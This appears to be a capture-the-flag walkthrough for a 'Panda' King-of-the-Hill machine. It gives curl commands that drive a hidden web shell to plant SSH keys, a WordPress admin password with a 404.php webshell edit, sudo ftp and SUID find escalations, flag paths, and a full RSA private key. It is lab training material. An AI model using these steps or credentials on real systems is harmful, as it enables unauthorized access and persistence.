# Panda KOTH machine

Can get in straight with tigress's key below

## Foothold 1 as user shifu

Easiest way in is via a cmd shell in a hidden dir on port 80:

```http://<ip>/06d63d6798d9b6c2f987f045b12031d6/index.php```

There is no ncat on the machine. But shell runs as shifu user so can create a ssh profile to ssh in with:

```
mkdir ~/.ssh
echo ssh-rsa [pubkey] > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

This can be done via pure curl:

```
curl -d 'cmd=mkdir+%7E%2F.ssh' http://$RHOST/06d63d6798d9b6c2f987f045b12031d6/index.php
curl -d "cmd=echo+$(cat ~/.ssh/id_ed25519.pub)+%3E+%7E%2F.ssh%2Fauthorized_keys" http://$RHOST/06d63d6798d9b6c2f987f045b12031d6/index.php
curl -d 'cmd=chmod+600+%7E%2F.ssh%2Fauthorized_keys' http://$RHOST/06d63d6798d9b6c2f987f045b12031d6/index.php
curl -d 'cmd=chmod+700+%7E%2F.ssh' http://$RHOST/06d63d6798d9b6c2f987f045b12031d6/index.php
```

then `ssh shifu@<ip>`

## Foothold 2 as user shifu

On port :80/wordpress is a wordpress instance with a single user, `po`. This user has the password `password1` and is the wordpress administrator. One under admin, the 404.php page of the theme can be altered to added a webshell payload.

## Paths to Root

- shifu can run `ftp` as sudo; to privesc from shifu, can use `sudo /usr/bin/ftp` then `!/bin/sh`
- `find` has the suid bit set

there is no chattr on the box

## XXE on 1337

Port 1337 hosts a registration form that is vulnerable to XXE - not too sure how to use it for a foothold though

## flags

- /root/.flag
- /home/po/flag.txt
- /home/shifu/flag.txt
- /home/tigress/flag.txt
- /var/www/html/flag/index.html (hex and b64)
- /var/www/html/06d63d6798d9b6c2f987f045b12031d6/flag
- /srv/samba/anonymous/binary (strings)

## Tigress's id_rsa

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0rJZ4ALm6AgaONlRb5YmyTYRqXkI6c/+TGg9biygTS1GiYFC
E+jMqk+q9nsl0cWFjns4Z2MA5uxiPzix7LcywiB6zScGcSkYaqKCFoOFT3VlpQYh
hhSHpPyv2Td6x6D1VhkYC/B2ilQsJJyqbGQ10JnP9wo1USzh21bsBPBs+wz6dnKZ
oY7BWkE1PwBfjhEVEFBSz5XfmcoOK2RQqAJ1YYWoxHA0fJ88pj7PahIGkGrq6g/Z
8AGZhYdZBSl91gMAnRjOrYIq8ufnJNw0YQpA78h9VDJUfXXfEe3EGCTpmcOH0NMa
RyoMS9qreJZ1NgwuTlFJwp5zj9RMRDBqnv/hcQIDAQABAoIBAAOyeX1Cz8Z2je89
cP5iRh/1wO2WYB+qNK4mjh1mzxFLoBc9m2k6Bo1ehIN6ubkqnCNZ6i12QUfMEhVF
62lZ9ZwOcdkzvBs0O2dznpDCkg5I4xW4O9JcfdzZSkSngpIKMwPlwNREze+zdmrW
DO+F+qPEby/IkBLylKwCpHWZum/VTEj1fYCJVHbZf5Pycdg0nOFHigGdpnJW18LI
yL9Firkc4TVsEd1a05THeENvp2nCnreIpBkyf32lOZB7M6AWFsROY1UApLtN7KS/
YPGnL2aftlCfrCqqj5WZQ7AUPAQPqgW+LYr+VaIRHyeRQnK1SFYZfV9PiYC3eloU
U8zMAxkCgYEA/eEHG1fjHb9v5U5leUyQDka9T35+Fq4P+sJh3c3bAQgwBQ0t5576
ZKobHwJZBXGE44gr8DmYnQWRymWWTly0weBMRv6kLCchU9BTGg0SsAEVKxtq+VUp
UyC/N4C0eWl3OAl4JsCpj0z/uc3oMryFyWr7lBajOwrKX0tsLcBqXvMCgYEA1HT4
FFHxwrrhsKztT6CtwHePnDbmzAoo6aSMIAeAf8dkQpddLAw85lHVGUZZie7OxXS7
euOwg15omV+9AxxRne0SEIAf8ldtiyquH+LaZHQElkPpdj2B6rznBywovLNDY4AT
biUGze+MwlH9gUHuyaULB9vcw9Dz30S/XgKwPwsCgYEAg1mQZroy3Co2h0nnQDm3
cltxCJbmP2+w/sjg/3PI8iC9T2/BJ0veOoSz4XhCfIl9+oZyTShPaDYAdtnWSRa3
wnL8o+KNJ/bazFVFGX5YA82bmSDnWLaR2dtgcyPYu9QwBUMI8evODkEFMalxkAZv
pYT/Ql/v9dUgXOtVvdoGbrcCgYEA0k6/TA4ZzXOE+YkUmOArXvx7cl1+dbgQ68dw
1jvW3aYY/zoqhvHOTwfudEiJVdrJX/i/pVRCZKhNzpVQ2wVrXXNRkHfkJ9aXn00u
dG3xVcLqz3yGW/9i3WUFJLp30ON678HWeg+4/p4Erk7PLOaBY6Y2lx7zF/t9jSPW
c08h/CUCgYA2cFZCvohbd27q0BDVHZQhAhLIRnRexTL4urF7Y+BzyGDiiPKcFYM8
44Ruf0x4Yvkjx1k4OR1njTKSmnPA4FSu/jzUH0KsVPUe0Kyx9W6VVyw1LLYuj/iY
KQCo0DuuJ1a3H0niYraMvmpiF73XW72l8SZGw+xT+741AxqZ5ljRpQ==
-----END RSA PRIVATE KEY-----
```
